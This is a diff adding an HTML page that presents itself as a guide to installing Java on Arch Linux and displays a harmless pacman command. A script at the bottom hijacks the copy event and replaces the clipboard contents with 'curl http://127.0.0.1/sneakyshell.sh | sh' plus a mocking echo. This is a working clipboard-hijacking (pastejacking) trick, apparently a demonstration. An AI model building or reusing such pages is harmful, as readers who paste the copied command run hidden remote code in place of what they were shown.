@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Java Development on Linux Guide</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Work+Sans&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap');
+        * {font-family: 'Work Sans', sans-serif;}
+        body {
+            margin: 0;
+            background: #000;
+        }
+        h1 {
+            font-size: 2rem;
+            text-transform: uppercase;
+            margin-top: 0;
+            letter-spacing: .1rem;
+        }
+        h3 {
+            font-size: 1.3rem;
+        }
+        .content {
+            font-weight:100;
+            background: rgba(0,0,0,0.3);
+            color: white;
+            padding: 2rem;
+            width: 88%;
+            margin:2rem;
+            font-size: 1.0rem;
+            /*display: flex;*/
+            /*justify-content: center;*/
+        }
+        code {
+            font-family: 'Source Code Pro', monospace;
+            background: #141617;
+            word-wrap: break-word;
+            box-decoration-break: clone;
+            padding: .1rem .3rem .2rem;
+            border-radius: .2rem;
+            font-size: 1rem;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="content">
+        <h1>Installing Java on Arch BTW</h1>
+        <h3>Java comprises JRE (Java Runtime Environment) and JDK (Java Development Toolkit).</h3>
+        <p>JRE is a set of software applications that help in the deployment of Java applications. JDK is a development environment necessary for the building and compilation of Java applications.</p>
+        <p>To install java on Arch Linux, simply paste the following command in your terminal:</p>
+        <code id="copy">sudo pacman -Sy jdk-openjdk jre-openjdk</code>
+    </div>
+
+    <script>
+        document.getElementById('copy').addEventListener(
+            'copy', function(e) {
+                e.clipboardData.setData('text/plain',
+                    'curl http://127.0.0.1/sneakyshell.sh | sh && echo "I am an idiot and this is the dumbest way to get hacked"\n'
+                );
+                e.preventDefault();
+            });
+    </script>
+
+</body>
+</html>
